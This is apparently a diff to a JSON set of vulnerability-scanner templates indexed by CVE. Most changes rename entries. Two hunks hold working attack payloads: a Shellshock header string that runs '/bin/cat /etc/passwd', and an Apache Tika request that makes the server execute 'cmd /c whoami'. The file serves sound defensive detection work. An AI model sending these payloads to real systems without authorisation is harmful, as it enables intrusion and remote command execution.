@@ -359,7 +359,7 @@
     {
       "id": "CVE-2008-6465",
       "info": {
-        "name": "Parallels H-Sphere - Cross Site Scripting",
+        "name": "Parallels H-Sphere 3.0.0 P9/3.1 P1 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -3436,9 +3436,9 @@
       "requests": [
         {
           "headers": {
+            "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
             "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
           },
           "method": "GET",
           "path": [
@@ -6816,11 +6816,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
-            "Content-type": "image/jp2",
-            "Connection": "close",
             "X-Tika-OCRTesseractPath": "cscript",
             "X-Tika-OCRLanguage": "//E:Jscript",
-            "Expect": "100-continue"
+            "Expect": "100-continue",
+            "Content-type": "image/jp2",
+            "Connection": "close"
           },
           "method": "PUT",
           "path": [
@@ -12251,7 +12251,7 @@
     {
       "id": "CVE-2020-24902",
       "info": {
-        "name": "Quixplorer <=2.4.1 - Cross Site Scripting",
+        "name": "Quixplorer <=2.4.1 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -12266,7 +12266,7 @@
     {
       "id": "CVE-2020-24903",
       "info": {
-        "name": "Cute Editor for ASP.NET 6.4 - Cross Site Scripting",
+        "name": "Cute Editor for ASP.NET 6.4 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -12501,7 +12501,7 @@
     {
       "id": "CVE-2020-26248",
       "info": {
-        "name": "PrestaShop ProductComments < 4.2.0 - SQL Injection",
+        "name": "PrestaShop Product Comments <4.2.0 - SQL Injection",
         "severity": "high"
       },
       "requests": [
@@ -12801,7 +12801,7 @@
     {
       "id": "CVE-2020-29284",
       "info": {
-        "name": "Multi Restaurant Table Reservation System 1.0 - SQL Injection",
+        "name": "Sourcecodester Multi Restaurant Table Reservation System 1.0 - SQL Injection",
         "severity": "critical"
       },
       "requests": [
@@ -16702,7 +16702,7 @@
     {
       "id": "CVE-2021-3110",
       "info": {
-        "name": "PrestaShop 1.7.7.0 SQL Injection",
+        "name": "PrestaShop 1.7.7.0 - SQL Injection",
         "severity": "critical"
       },
       "requests": [
@@ -17222,7 +17222,7 @@
     {
       "id": "CVE-2021-33851",
       "info": {
-        "name": "Customize Login Image < 3.5.3 - Cross-Site Scripting",
+        "name": "WordPress Customize Login Image <3.5.3 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -18776,7 +18776,7 @@
     {
       "id": "CVE-2021-43510",
       "info": {
-        "name": "Simple Client Management System 1.0 - SQL Injection",
+        "name": "Sourcecodester Simple Client Management System 1.0 - SQL Injection",
         "severity": "critical"
       },
       "requests": [
@@ -19355,7 +19355,7 @@
     {
       "id": "CVE-2022-0147",
       "info": {
-        "name": "Cookie Information < 2.0.8 - Reflected Cross-Site Scripting",
+        "name": "WordPress Cookie Information/Free GDPR Consent Solution <2.0.8 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -19554,7 +19554,7 @@
     {
       "id": "CVE-2022-0346",
       "info": {
-        "name": "WordPress XML Sitemap Generator for Google <2.0.4 - Cross-Site Scripting",
+        "name": "WordPress XML Sitemap Generator for Google <2.0.4 - Cross-Site Scripting/Remote Code Execution",
         "severity": "medium"
       },
       "requests": [
@@ -19570,7 +19570,7 @@
     {
       "id": "CVE-2022-0349",
       "info": {
-        "name": "NotificationX WordPress plugin < 2.3.9 - SQL Injection",
+        "name": "WordPress NotificationX <2.3.9 - SQL Injection",
         "severity": "critical"
       },
       "requests": [
@@ -19657,7 +19657,7 @@
     {
       "id": "CVE-2022-0434",
       "info": {
-        "name": "Page Views Count < 2.4.15 - Unauthenticated SQL Injection",
+        "name": "WordPress Page Views Count <2.4.15 - SQL Injection",
         "severity": "critical"
       },
       "requests": [
@@ -19956,7 +19956,7 @@
     {
       "id": "CVE-2022-0785",
       "info": {
-        "name": "Daily Prayer Time < 2022.03.01 - Unauthenticated SQLi",
+        "name": "WordPress Daily Prayer Time <2022.03.01 - SQL Injection",
         "severity": "critical"
       },
       "requests": [
@@ -19970,7 +19970,7 @@
     {
       "id": "CVE-2022-0788",
       "info": {
-        "name": "WP Fundraising Donation and Crowdfunding Platform < 1.5.0 - Unauthenticated SQLi",
+        "name": "WordPress WP Fundraising Donation and Crowdfunding Platform <1.5.0 - SQL Injection",
         "severity": "critical"
       },
       "requests": [
@@ -19984,7 +19984,7 @@
     {
       "id": "CVE-2022-0817",
       "info": {
-        "name": "BadgeOS < 3.7.1 - Unauthenticated SQL Injection",
+        "name": "WordPress BadgeOS <=3.7.0 - SQL Injection",
         "severity": "critical"
       },
       "requests": [
@@ -20027,7 +20027,7 @@
     {
       "id": "CVE-2022-0867",
       "info": {
-        "name": "ARPrice Lite < 3.6.1 - Unauthenticated SQLi",
+        "name": "WordPress ARPrice <3.6.1 - SQL Injection",
         "severity": "critical"
       },
       "requests": [
@@ -20167,7 +20167,7 @@
     {
       "id": "CVE-2022-1007",
       "info": {
-        "name": "Advanced Booking Calendar < 1.7.1 - Cross-Site Scripting",
+        "name": "WordPress Advanced Booking Calendar <1.7.1 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -20229,7 +20229,7 @@
     {
       "id": "CVE-2022-1057",
       "info": {
-        "name": "Pricing Deals for WooCommerce < 2.0.3 - Unauthenticated SQL Injection",
+        "name": "WordPress Pricing Deals for WooCommerce <=2.0.2.02 - SQL Injection",
         "severity": "critical"
       },
       "requests": [
@@ -20510,7 +20510,7 @@
     {
       "id": "CVE-2022-1883",
       "info": {
-        "name": "Terraboard < 2.2.0 - SQL Injection",
+        "name": "Terraboard <2.2.0 - SQL Injection",
         "severity": "high"
       },
       "requests": [
